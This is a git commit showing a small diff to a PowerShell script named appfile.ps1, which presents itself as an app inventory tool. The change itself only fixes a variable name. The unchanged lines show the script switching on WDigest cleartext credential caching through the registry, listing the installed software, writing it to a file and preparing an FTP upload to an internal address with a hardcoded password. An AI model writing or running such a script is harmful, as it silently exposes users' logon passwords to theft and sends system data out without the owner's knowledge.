5091071e46ea247358da84359d872894f37f0d34
squentel <30870132+squentel@users.noreply.github.com>
2021-11-15 16:56:24 +0100

    Update appfile.ps1

--- appfile.ps1
+++ appfile.ps1
@@ -1,5 +1,5 @@
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-$listApp=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
+$listApps=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
 $listApps | Out-File -filepath C:\myapps.txt
 $file = "C:\myapps.txt"
 $ftpuri = "ftp://simon:QuenteL789!@172.17.0.34/myapps2.txt"
